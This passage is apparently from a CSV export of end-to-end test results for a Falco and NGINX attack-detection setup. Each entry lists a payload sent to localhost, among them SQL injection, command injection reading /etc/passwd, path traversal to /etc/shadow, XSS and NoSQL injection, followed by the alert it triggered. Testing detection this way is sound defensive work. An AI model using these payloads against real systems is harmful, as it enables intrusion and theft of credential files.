+- **Payload**: `../../../../`
+- **Encoded**: `../../../../`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~14000ms
+- **Timestamp**: 15:09:23.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_BASIC_004-1765465763832-gezy1p pattern_id=PATH_BASIC_004 uri=/?q=../../../../ client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:23.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_BASIC_004-1765465763832-gezy1p pattern_id=PATH_BASIC_004 uri=/?q=../../../../ client=127.0.0.1
+```","2","test_e2e_with_logs[059_PATH_BASIC_004]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `SQLI_ERR_001` |
+| **Name** | MySQL EXTRACTVALUE error-based |
+| **Category** | SQLI |
+| **Subcategory** | error_based |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `EXTRACTVALUE(1,CONCAT(0x7e,version()))`
+- **Encoded**: `EXTRACTVALUE(1%2CCONCAT(0x7e%2Cversion()))`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~12000ms
+- **Timestamp**: 15:09:25.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_ERR_001-1765465765866-f555h pattern_id=SQLI_ERR_001 uri=/?q=EXTRACTVALUE(1%2CCONCAT(0x7e%2Cversion())) client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:25.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_ERR_001-1765465765866-f555h pattern_id=SQLI_ERR_001 uri=/?q=EXTRACTVALUE(1%2CCONCAT(0x7e%2Cversion())) client=127.0.0.1 method=GET
+```","1","test_e2e_with_logs[008_SQLI_ERR_001]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `CMD_BASIC_002` |
+| **Name** | AND operator with whoami |
+| **Category** | CMDINJ |
+| **Subcategory** | basic_command_injection |
+| **Severity** | `CRITICAL` |
+
+## Attack Details
+
+- **Payload**: `&& whoami`
+- **Encoded**: `%26%26%20whoami`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~10000ms
+- **Timestamp**: 15:09:27.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_002-1765465767831-vevahu pattern_id=CMD_BASIC_002 uri=/?q=%26%26%20whoami client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:27.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_002-1765465767831-vevahu pattern_id=CMD_BASIC_002 uri=/?q=%26%26%20whoami client=127.0.0.1
+```","1","test_e2e_with_logs[076_CMD_BASIC_002]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `CMD_BASIC_014` |
+| **Name** | Multiple semicolons injection |
+| **Category** | CMDINJ |
+| **Subcategory** | basic_command_injection |
+| **Severity** | `CRITICAL` |
+
+## Attack Details
+
+- **Payload**: `;;ls`
+- **Encoded**: `%3B%3Bls`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~4000ms
+- **Timestamp**: 15:09:33.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX CMDi] Command injection via semicolon test_id=CMD_BASIC_014-1765465773845-ej7d0r pattern_id=CMD_BASIC_014 uri=/?q=%3B%3Bls client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:33.000000000: Critical [NGINX CMDi] Command injection via semicolon test_id=CMD_BASIC_014-1765465773845-ej7d0r pattern_id=CMD_BASIC_014 uri=/?q=%3B%3Bls client=127.0.0.1
+```","2","test_e2e_with_logs[088_CMD_BASIC_014]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `PATH_ENC_002` |
+| **Name** | Double URL encoded traversal |
+| **Category** | PATH |
+| **Subcategory** | encoded_traversal |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `%252e%252e%252f`
+- **Encoded**: `%25252e%25252e%25252f`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~5000ms
+- **Timestamp**: 15:09:32.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX Traversal] Encoded path traversal attack detected test_id=PATH_ENC_002-1765465772854-89p19a pattern_id=PATH_ENC_002 uri=/?q=%25252e%25252e%25252f client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:32.000000000: Critical [NGINX Traversal] Encoded path traversal attack detected test_id=PATH_ENC_002-1765465772854-89p19a pattern_id=PATH_ENC_002 uri=/?q=%25252e%25252e%25252f client=127.0.0.1
+```","2","test_e2e_with_logs[072_PATH_ENC_002]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `CMD_BASIC_005` |
+| **Name** | Password file access attempt |
+| **Category** | CMDINJ |
+| **Subcategory** | basic_command_injection |
+| **Severity** | `CRITICAL` |
+
+## Attack Details
+
+- **Payload**: `; cat /etc/passwd`
+- **Encoded**: `%3B%20cat%20/etc/passwd`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~8000ms
+- **Timestamp**: 15:09:29.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX CMDi] Command injection via semicolon test_id=CMD_BASIC_005-1765465769335-oh54q pattern_id=CMD_BASIC_005 uri=/?q=%3B%20cat%20/etc/passwd client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:29.000000000: Critical [NGINX CMDi] Command injection via semicolon test_id=CMD_BASIC_005-1765465769335-oh54q pattern_id=CMD_BASIC_005 uri=/?q=%3B%20cat%20/etc/passwd client=127.0.0.1
+```","2","test_e2e_with_logs[079_CMD_BASIC_005]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `SQLI_TIME_013` |
+| **Name** | Sleep with SQL comment |
+| **Category** | SQLI |
+| **Subcategory** | time_based_blind |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `SLEEP/*comment*/(5)`
+- **Encoded**: `SLEEP/%2Acomment%2A/%285%29`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~19000ms
+- **Timestamp**: 15:09:18.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_013-1765465758347-vbw3hc pattern_id=SQLI_TIME_013 uri=/?q=SLEEP/%2Acomment%2A/%285%29 client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:18.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_013-1765465758347-vbw3hc pattern_id=SQLI_TIME_013 uri=/?q=SLEEP/%2Acomment%2A/%285%29 client=127.0.0.1 method=GET
+```","1","test_e2e_with_logs[022_SQLI_TIME_013]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `SQLI_TIME_012` |
+| **Name** | Mixed case sleep function |
+| **Category** | SQLI |
+| **Subcategory** | time_based_blind |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `SLeep(5)`
+- **Encoded**: `SLeep%285%29`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~20000ms
+- **Timestamp**: 15:09:17.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_012-1765465757845-ywl95 pattern_id=SQLI_TIME_012 uri=/?q=SLeep%285%29 client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:17.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_012-1765465757845-ywl95 pattern_id=SQLI_TIME_012 uri=/?q=SLeep%285%29 client=127.0.0.1 method=GET
+```","1","test_e2e_with_logs[021_SQLI_TIME_012]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `XSS_REFL_014` |
+| **Name** | javascript: protocol in href |
+| **Category** | XSS |
+| **Subcategory** | reflected_xss |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `<a href=""javascript:alert(1)"">click</a>`
+- **Encoded**: `%3Ca%20href%3D%22javascript%3Aalert(1)%22%3Eclick%3C%2Fa%3E`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~14000ms
+- **Timestamp**: 15:09:23.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_014-1765465763845-uv2ebt pattern_id=XSS_REFL_014 uri=/?q=%3Ca%20href%3D%22javascript%3Aalert(1)%22%3Eclick%3C%2Fa%3E client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:23.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_014-1765465763845-uv2ebt pattern_id=XSS_REFL_014 uri=/?q=%3Ca%20href%3D%22javascript%3Aalert(1)%22%3Eclick%3C%2Fa%3E client=127.0.0.1 method=GET
+```","2","test_e2e_with_logs[049_XSS_REFL_014]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `XSS_DOM_003` |
+| **Name** | eval() code injection |
+| **Category** | XSS |
+| **Subcategory** | dom_based_xss |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `eval('alert(document.domain)')`
+- **Encoded**: `eval('alert(document.domain)')`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~10000ms
+- **Timestamp**: 15:09:27.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX XSS] Advanced XSS Attack Attempt test_id=XSS_DOM_003-1765465767353-vddc8e pattern_id=XSS_DOM_003 uri=/?q=eval('alert(document.domain)') client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:27.000000000: Warning [NGINX XSS] Advanced XSS Attack Attempt test_id=XSS_DOM_003-1765465767353-vddc8e pattern_id=XSS_DOM_003 uri=/?q=eval('alert(document.domain)') client=127.0.0.1 method=GET
+```","1","test_e2e_with_logs[032_XSS_DOM_003]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `EMRG_MONGO_004` |
+| **Name** | MongoDB regex wildcard injection |
+| **Category** | OTHER |
+| **Subcategory** | mongodb_injection |
+| **Severity** | `MEDIUM` |
+
+## Attack Details
+
+- **Payload**: `{""$regex"": "".*""}`
+- **Encoded**: `%7B%22%24regex%22%3A%20%22.%2A%22%7D`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~4000ms
+- **Timestamp**: 15:09:33.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_004-1765465773834-9vugda pattern_id=EMRG_MONGO_004 uri=/?q=%7B%22%24regex%22%3A%20%22.%2A%22%7D client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:33.000000000: Critical [NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_004-1765465773834-9vugda pattern_id=EMRG_MONGO_004 uri=/?q=%7B%22%24regex%22%3A%20%22.%2A%22%7D client=127.0.0.1
+```","1","test_e2e_with_logs[099_EMRG_MONGO_004]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `SQLI_TIME_001` |
+| **Name** | Basic MySQL SLEEP function |
+| **Category** | SQLI |
+| **Subcategory** | time_based_blind |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `SLEEP(5)`
+- **Encoded**: `SLEEP%285%29`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~25000ms
+- **Timestamp**: 15:09:12.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_001-1765465752328-j0qkc pattern_id=SQLI_TIME_001 uri=/?q=SLEEP%285%29 client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:12.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_001-1765465752328-j0qkc pattern_id=SQLI_TIME_001 uri=/?q=SLEEP%285%29 client=127.0.0.1 method=GET
+```","2","test_e2e_with_logs[010_SQLI_TIME_001]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `XSS_ENC_002` |
+| **Name** | Unicode escaped script tag |
+| **Category** | XSS |
+| **Subcategory** | encoding_bypass |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `\u003cscript\u003ealert(1)\u003c/script\u003e`
+- **Encoded**: `%5Cu003cscript%5Cu003ealert(1)%5Cu003c%2Fscript%5Cu003e`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~12000ms
+- **Timestamp**: 15:09:25.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_ENC_002-1765465765348-5cfhc3 pattern_id=XSS_ENC_002 uri=/?q=%5Cu003cscript%5Cu003ealert(1)%5Cu003c%2Fscript%5Cu003e client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:25.000000000: Warning [NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_ENC_002-1765465765348-5cfhc3 pattern_id=XSS_ENC_002 uri=/?q=%5Cu003cscript%5Cu003ealert(1)%5Cu003c%2Fscript%5Cu003e client=127.0.0.1 method=GET
+```","2","test_e2e_with_logs[034_XSS_ENC_002]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `XSS_REFL_005` |
+| **Name** | Body onload XSS |
+| **Category** | XSS |
+| **Subcategory** | reflected_xss |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `<body onload=alert('XSS')>`
+- **Encoded**: `%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~18000ms
+- **Timestamp**: 15:09:19.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_005-1765465759334-dfzzeq pattern_id=XSS_REFL_005 uri=/?q=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:19.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_005-1765465759334-dfzzeq pattern_id=XSS_REFL_005 uri=/?q=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E client=127.0.0.1 method=GET
+```","2","test_e2e_with_logs[040_XSS_REFL_005]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `PATH_DOT_010` |
+| **Name** | MySQL config access via traversal |
+| **Category** | PATH |
+| **Subcategory** | dot_dot_slash |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `../../../etc/mysql/my.cnf`
+- **Encoded**: `../../../etc/mysql/my.cnf`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~8000ms
+- **Timestamp**: 15:09:29.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_010-1765465769347-tkye8d pattern_id=PATH_DOT_010 uri=/?q=../../../etc/mysql/my.cnf client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:29.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_010-1765465769347-tkye8d pattern_id=PATH_DOT_010 uri=/?q=../../../etc/mysql/my.cnf client=127.0.0.1
+```","1","test_e2e_with_logs[070_PATH_DOT_010]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `SQLI_TIME_007` |
+| **Name** | Base64 + URL encoded SLEEP(5) |
+| **Category** | SQLI |
+| **Subcategory** | time_based_blind |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `U0xFRVAoNSk%3D`
+- **Encoded**: `U0xFRVAoNSk%253D`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~22000ms
+- **Timestamp**: 15:09:15.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_007-1765465755339-fouqa pattern_id=SQLI_TIME_007 uri=/?q=U0xFRVAoNSk%253D client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:15.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_007-1765465755339-fouqa pattern_id=SQLI_TIME_007 uri=/?q=U0xFRVAoNSk%253D client=127.0.0.1 method=GET
+```","1","test_e2e_with_logs[016_SQLI_TIME_007]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `XSS_ENC_003` |
+| **Name** | Mixed case script tag bypass |
+| **Category** | XSS |
+| **Subcategory** | encoding_bypass |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `<ScRiPt>alert(1)</ScRiPt>`
+- **Encoded**: `%3CScRiPt%3Ealert(1)%3C%2FScRiPt%3E`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~12000ms
+- **Timestamp**: 15:09:25.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_ENC_003-1765465765850-dv8do pattern_id=XSS_ENC_003 uri=/?q=%3CScRiPt%3Ealert(1)%3C%2FScRiPt%3E client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:25.000000000: Warning [NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_ENC_003-1765465765850-dv8do pattern_id=XSS_ENC_003 uri=/?q=%3CScRiPt%3Ealert(1)%3C%2FScRiPt%3E client=127.0.0.1 method=GET
+```","1","test_e2e_with_logs[035_XSS_ENC_003]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `SQLI_TIME_011` |
+| **Name** | Lowercase sleep function |
+| **Category** | SQLI |
+| **Subcategory** | time_based_blind |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `sleep(5)`
+- **Encoded**: `sleep%285%29`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~20000ms
+- **Timestamp**: 15:09:17.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_011-1765465757344-l16v97 pattern_id=SQLI_TIME_011 uri=/?q=sleep%285%29 client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:17.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_011-1765465757344-l16v97 pattern_id=SQLI_TIME_011 uri=/?q=sleep%285%29 client=127.0.0.1 method=GET
+```","2","test_e2e_with_logs[020_SQLI_TIME_011]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `SQLI_TIME_018` |
+| **Name** | SQL Server WAITFOR TIME |
+| **Category** | SQLI |
+| **Subcategory** | time_based_blind |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `WAITFOR TIME '00:00:05'`
+- **Encoded**: `WAITFOR%20TIME%20'00%3A00%3A05'`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~15000ms
+- **Timestamp**: 15:09:22.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_018-1765465762859-zrcv5 pattern_id=SQLI_TIME_018 uri=/?q=WAITFOR%20TIME%20'00%3A00%3A05' client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:22.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_018-1765465762859-zrcv5 pattern_id=SQLI_TIME_018 uri=/?q=WAITFOR%20TIME%20'00%3A00%3A05' client=127.0.0.1 method=GET
+```","1","test_e2e_with_logs[027_SQLI_TIME_018]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `CMD_BASIC_020` |
+| **Name** | CRLF injection with cat |
+| **Category** | CMDINJ |
+| **Subcategory** | basic_command_injection |
+| **Severity** | `CRITICAL` |
+
+## Attack Details
+
+- **Payload**: `%0d%0acat /etc/passwd`
+- **Encoded**: `%250d%250acat%20%2Fetc%2Fpasswd`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~1000ms
+- **Timestamp**: 15:09:36.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_020-1765465776854-9hake pattern_id=CMD_BASIC_020 uri=/?q=%250d%250acat%20%2Fetc%2Fpasswd client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:36.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_020-1765465776854-9hake pattern_id=CMD_BASIC_020 uri=/?q=%250d%250acat%20%2Fetc%2Fpasswd client=127.0.0.1
+```","1","test_e2e_with_logs[094_CMD_BASIC_020]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `PATH_ABS_004` |
+| **Name** | Authentication log access |
+| **Category** | PATH |
+| **Subcategory** | absolute_paths |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `/var/log/auth.log`
+- **Encoded**: `/var/log/auth.log`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~6000ms
+- **Timestamp**: 15:09:31.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_004-1765465771351-k0i6wm pattern_id=PATH_ABS_004 uri=/?q=/var/log/auth.log client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:31.000000000: Critical [NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_004-1765465771351-k0i6wm pattern_id=PATH_ABS_004 uri=/?q=/var/log/auth.log client=127.0.0.1
+```","1","test_e2e_with_logs[054_PATH_ABS_004]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `XSS_REFL_003` |
+| **Name** | SVG onload XSS |
+| **Category** | XSS |
+| **Subcategory** | reflected_xss |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `<svg onload=alert('XSS')>`
+- **Encoded**: `%3Csvg%20onload%3Dalert%28%27XSS%27%29%3E`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~19000ms
+- **Timestamp**: 15:09:18.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_003-1765465758332-j98fc4 pattern_id=XSS_REFL_003 uri=/?q=%3Csvg%20onload%3Dalert%28%27XSS%27%29%3E client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:18.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_003-1765465758332-j98fc4 pattern_id=XSS_REFL_003 uri=/?q=%3Csvg%20onload%3Dalert%28%27XSS%27%29%3E client=127.0.0.1 method=GET
+```","1","test_e2e_with_logs[038_XSS_REFL_003]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `PATH_ABS_002` |
+| **Name** | Direct absolute path to shadow file |
+| **Category** | PATH |
+| **Subcategory** | absolute_paths |
+| **Severity** | `CRITICAL` |
+
+## Attack Details
+
+- **Payload**: `/etc/shadow`
+- **Encoded**: `/etc/shadow`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~7000ms
+- **Timestamp**: 15:09:30.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_002-1765465770349-8j7cvi pattern_id=PATH_ABS_002 uri=/?q=/etc/shadow client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:30.000000000: Critical [NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_002-1765465770349-8j7cvi pattern_id=PATH_ABS_002 uri=/?q=/etc/shadow client=127.0.0.1
+```","1","test_e2e_with_logs[052_PATH_ABS_002]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `PATH_ABS_001` |
+| **Name** | Direct absolute path to passwd file |
+| **Category** | PATH |
+| **Subcategory** | absolute_paths |
+| **Severity** | `CRITICAL` |
+
+## Attack Details
+
+- **Payload**: `/etc/passwd`
+- **Encoded**: `/etc/passwd`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~8000ms
+- **Timestamp**: 15:09:29.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_001-1765465769848-lgj1gb pattern_id=PATH_ABS_001 uri=/?q=/etc/passwd client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:29.000000000: Critical [NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_001-1765465769848-lgj1gb pattern_id=PATH_ABS_001 uri=/?q=/etc/passwd client=127.0.0.1
+```","1","test_e2e_with_logs[051_PATH_ABS_001]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `PATH_BASIC_001` |
+| **Name** | Basic parent directory traversal |
+| **Category** | PATH |
+| **Subcategory** | basic_traversal |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `../`
+- **Encoded**: `../`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~15000ms
+- **Timestamp**: 15:09:22.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_BASIC_001-1765465762329-kl3oah pattern_id=PATH_BASIC_001 uri=/?q=../ client=127.0.0.1
+
+**Falco Log Entry**:
+```
